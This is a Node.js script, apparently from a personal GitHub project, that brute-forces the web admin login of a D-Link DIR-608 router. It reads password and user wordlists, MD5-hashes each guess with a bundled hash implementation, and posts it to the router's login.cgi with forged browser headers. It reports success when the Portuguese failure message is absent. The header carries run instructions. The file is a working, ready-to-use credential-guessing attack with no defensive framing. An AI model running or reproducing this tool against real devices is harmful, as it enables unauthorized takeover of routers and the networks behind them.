/*

Author    :    Marcos Venicius
GitHub    :    https://github.com/marcos-dev-web
Instagram :    https://www.instagram.com/marcos.dev.web
Date      :    29/04/21

----------------------------------------------------

Tested into        :    Wireless - D-Link DIR-608
Version Hardware   :    A1
VersionFirmware    :    1.00

node version       :    v14.16.1
axios version      :    ^0.21.1

Operational System :    Windows 10

----------------------------------------------------

To run

1. yarn install
  if you not have yarn, npm i -g yarn

2. create a file named passwords.txt and put your paswords.
  in the terminal type: node crack.js, and wait.

*/

const axios = require("axios");
const fs = require("fs");

const host = "192.168.11.1"; // change it
const filePasswords = "passwords.txt"; // put words top to down, one per line
const fileUsers = "users.txt"; // to don't use this, put 'null'

function hex_md5(s) {
	return rstr2hex(rstr_md5(str2rstr_utf8(s)));
}

function rstr_md5(s) {
	return binl2rstr(binl_md5(rstr2binl(s), s.length * 8));
}

function rstr2hex(input) {
	try {
		hexcase;
	} catch (e) {
		hexcase = 0;
	}
	var hex_tab = hexcase ? "0123456789ABCDEF" : "0123456789abcdef";
	var output = "";
	var x;
	for (var i = 0; i < input.length; i++) {
		x = input.charCodeAt(i);
		output += hex_tab.charAt((x >>> 4) & 0x0f) + hex_tab.charAt(x & 0x0f);
	}
	return output;
}

function str2rstr_utf8(input) {
	var output = "";
	var i = -1;
	var x, y;
	while (++i < input.length) {
		x = input.charCodeAt(i);
		y = i + 1 < input.length ? input.charCodeAt(i + 1) : 0;
		if (0xd800 <= x && x <= 0xdbff && 0xdc00 <= y && y <= 0xdfff) {
			x = 0x10000 + ((x & 0x03ff) << 10) + (y & 0x03ff);
			i++;
		}
		if (x <= 0x7f) output += String.fromCharCode(x);
		else if (x <= 0x7ff)
			output += String.fromCharCode(
				0xc0 | ((x >>> 6) & 0x1f),
				0x80 | (x & 0x3f)
			);
		else if (x <= 0xffff)
			output += String.fromCharCode(
				0xe0 | ((x >>> 12) & 0x0f),
				0x80 | ((x >>> 6) & 0x3f),
				0x80 | (x & 0x3f)
			);
		else if (x <= 0x1fffff)
			output += String.fromCharCode(
				0xf0 | ((x >>> 18) & 0x07),
				0x80 | ((x >>> 12) & 0x3f),
				0x80 | ((x >>> 6) & 0x3f),
				0x80 | (x & 0x3f)
			);
	}
	return output;
}
function rstr2binl(input) {
	var output = Array(input.length >> 2);
	for (var i = 0; i < output.length; i++) output[i] = 0;
	for (var i = 0; i < input.length * 8; i += 8)
		output[i >> 5] |= (input.charCodeAt(i / 8) & 0xff) << i % 32;
	return output;
}
function binl2rstr(input) {
	var output = "";
	for (var i = 0; i < input.length * 32; i += 8)
		output += String.fromCharCode((input[i >> 5] >>> i % 32) & 0xff);
	return output;
}
function binl_md5(x, len) {
	x[len >> 5] |= 0x80 << len % 32;
	x[(((len + 64) >>> 9) << 4) + 14] = len;
	var a = 1732584193;
	var b = -271733879;
	var c = -1732584194;
	var d = 271733878;
	for (var i = 0; i < x.length; i += 16) {
		var olda = a;
		var oldb = b;
		var oldc = c;
		var oldd = d;
		a = md5_ff(a, b, c, d, x[i + 0], 7, -680876936);
		d = md5_ff(d, a, b, c, x[i + 1], 12, -389564586);
		c = md5_ff(c, d, a, b, x[i + 2], 17, 606105819);
		b = md5_ff(b, c, d, a, x[i + 3], 22, -1044525330);
		a = md5_ff(a, b, c, d, x[i + 4], 7, -176418897);
		d = md5_ff(d, a, b, c, x[i + 5], 12, 1200080426);
		c = md5_ff(c, d, a, b, x[i + 6], 17, -1473231341);
		b = md5_ff(b, c, d, a, x[i + 7], 22, -45705983);
		a = md5_ff(a, b, c, d, x[i + 8], 7, 1770035416);
		d = md5_ff(d, a, b, c, x[i + 9], 12, -1958414417);
		c = md5_ff(c, d, a, b, x[i + 10], 17, -42063);
		b = md5_ff(b, c, d, a, x[i + 11], 22, -1990404162);
		a = md5_ff(a, b, c, d, x[i + 12], 7, 1804603682);
		d = md5_ff(d, a, b, c, x[i + 13], 12, -40341101);
		c = md5_ff(c, d, a, b, x[i + 14], 17, -1502002290);
		b = md5_ff(b, c, d, a, x[i + 15], 22, 1236535329);
		a = md5_gg(a, b, c, d, x[i + 1], 5, -165796510);
		d = md5_gg(d, a, b, c, x[i + 6], 9, -1069501632);
		c = md5_gg(c, d, a, b, x[i + 11], 14, 643717713);
		b = md5_gg(b, c, d, a, x[i + 0], 20, -373897302);
		a = md5_gg(a, b, c, d, x[i + 5], 5, -701558691);
		d = md5_gg(d, a, b, c, x[i + 10], 9, 38016083);
		c = md5_gg(c, d, a, b, x[i + 15], 14, -660478335);
		b = md5_gg(b, c, d, a, x[i + 4], 20, -405537848);
		a = md5_gg(a, b, c, d, x[i + 9], 5, 568446438);
		d = md5_gg(d, a, b, c, x[i + 14], 9, -1019803690);
		c = md5_gg(c, d, a, b, x[i + 3], 14, -187363961);
		b = md5_gg(b, c, d, a, x[i + 8], 20, 1163531501);
		a = md5_gg(a, b, c, d, x[i + 13], 5, -1444681467);
		d = md5_gg(d, a, b, c, x[i + 2], 9, -51403784);
		c = md5_gg(c, d, a, b, x[i + 7], 14, 1735328473);
		b = md5_gg(b, c, d, a, x[i + 12], 20, -1926607734);
		a = md5_hh(a, b, c, d, x[i + 5], 4, -378558);
		d = md5_hh(d, a, b, c, x[i + 8], 11, -2022574463);
		c = md5_hh(c, d, a, b, x[i + 11], 16, 1839030562);
		b = md5_hh(b, c, d, a, x[i + 14], 23, -35309556);
		a = md5_hh(a, b, c, d, x[i + 1], 4, -1530992060);
		d = md5_hh(d, a, b, c, x[i + 4], 11, 1272893353);
		c = md5_hh(c, d, a, b, x[i + 7], 16, -155497632);
		b = md5_hh(b, c, d, a, x[i + 10], 23, -1094730640);
		a = md5_hh(a, b, c, d, x[i + 13], 4, 681279174);
		d = md5_hh(d, a, b, c, x[i + 0], 11, -358537222);
		c = md5_hh(c, d, a, b, x[i + 3], 16, -722521979);
		b = md5_hh(b, c, d, a, x[i + 6], 23, 76029189);
		a = md5_hh(a, b, c, d, x[i + 9], 4, -640364487);
		d = md5_hh(d, a, b, c, x[i + 12], 11, -421815835);
		c = md5_hh(c, d, a, b, x[i + 15], 16, 530742520);
		b = md5_hh(b, c, d, a, x[i + 2], 23, -995338651);
		a = md5_ii(a, b, c, d, x[i + 0], 6, -198630844);
		d = md5_ii(d, a, b, c, x[i + 7], 10, 1126891415);
		c = md5_ii(c, d, a, b, x[i + 14], 15, -1416354905);
		b = md5_ii(b, c, d, a, x[i + 5], 21, -57434055);
		a = md5_ii(a, b, c, d, x[i + 12], 6, 1700485571);
		d = md5_ii(d, a, b, c, x[i + 3], 10, -1894986606);
		c = md5_ii(c, d, a, b, x[i + 10], 15, -1051523);
		b = md5_ii(b, c, d, a, x[i + 1], 21, -2054922799);
		a = md5_ii(a, b, c, d, x[i + 8], 6, 1873313359);
		d = md5_ii(d, a, b, c, x[i + 15], 10, -30611744);
		c = md5_ii(c, d, a, b, x[i + 6], 15, -1560198380);
		b = md5_ii(b, c, d, a, x[i + 13], 21, 1309151649);
		a = md5_ii(a, b, c, d, x[i + 4], 6, -145523070);
		d = md5_ii(d, a, b, c, x[i + 11], 10, -1120210379);
		c = md5_ii(c, d, a, b, x[i + 2], 15, 718787259);
		b = md5_ii(b, c, d, a, x[i + 9], 21, -343485551);
		a = safe_add(a, olda);
		b = safe_add(b, oldb);
		c = safe_add(c, oldc);
		d = safe_add(d, oldd);
	}
	return Array(a, b, c, d);
}
function md5_cmn(q, a, b, x, s, t) {
	return safe_add(bit_rol(safe_add(safe_add(a, q), safe_add(x, t)), s), b);
}
function md5_ff(a, b, c, d, x, s, t) {
	return md5_cmn((b & c) | (~b & d), a, b, x, s, t);
}
function md5_gg(a, b, c, d, x, s, t) {
	return md5_cmn((b & d) | (c & ~d), a, b, x, s, t);
}
function md5_hh(a, b, c, d, x, s, t) {
	return md5_cmn(b ^ c ^ d, a, b, x, s, t);
}
function md5_ii(a, b, c, d, x, s, t) {
	return md5_cmn(c ^ (b | ~d), a, b, x, s, t);
}
function safe_add(x, y) {
	var lsw = (x & 0xffff) + (y & 0xffff);
	var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
	return (msw << 16) | (lsw & 0xffff);
}
function bit_rol(num, cnt) {
	return (num << cnt) | (num >>> (32 - cnt));
}

async function tryLogin(password, user = "Admin") {
	const username = user;
	const pass = password;
	password = hex_md5(pass);

	const params = new URLSearchParams();

	params.append("username", username);
	params.append("password", password);
	params.append("submit.htm?login.htm", "Login");

	const configs = {
		headers: {
			Host: host,
			Cookie: "SessionID=",
			"Upgrade-Insecure": "1",
			"Content-Type": "application/x-www-form-urlencoded",
			Origin: `http://${host}`,
			Referer: `http://${host}/login.htm`,
			"User-Agent":
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
		},
	};

	const url = `http://${host}/login.cgi`;

	const response = await axios.post(url, params, configs);

	const failResponse = "tente novamente";
	const resp = String(response.data);

	if (resp.indexOf(failResponse) !== -1) {
		return [false, username, pass];
	} else {
		return [true, username, pass];
	}
}

async function crack(passwords, users = ["Admin"]) {
	let done = false;
	for (let user of users) {
		if (!done) {
			for (let pass of passwords) {
				const login = await tryLogin(pass, user);

				if (login[0]) {
					console.log(
						`\nSuccessfuly login with: [${login[1]}]@[${login[2]}]\n`
					);
					done = true;
					break;
				} else {
					console.log(`Invalid Credentials: [${login[1]}]@[${login[2]}]`);
				}
			}
		} else {
			break;
		}
	}
}

fs.readFile(filePasswords, "utf-8", (_, lt) => {
	let passwords, users;
	passwords = [...lt.split("\r\n")]; // '\r\n' for windows, if is linux, change to '\n'
	if (fileUsers !== null) {
		fs.readFile(fileUsers, "utf-8", (_, lb) => {
			users = [...lb.split("\r\n")]; // '\r\n' for windows, if is linux, change to '\n'
			return crack(passwords, users);
		});
	} else {
		return crack(passwords);
	}
});
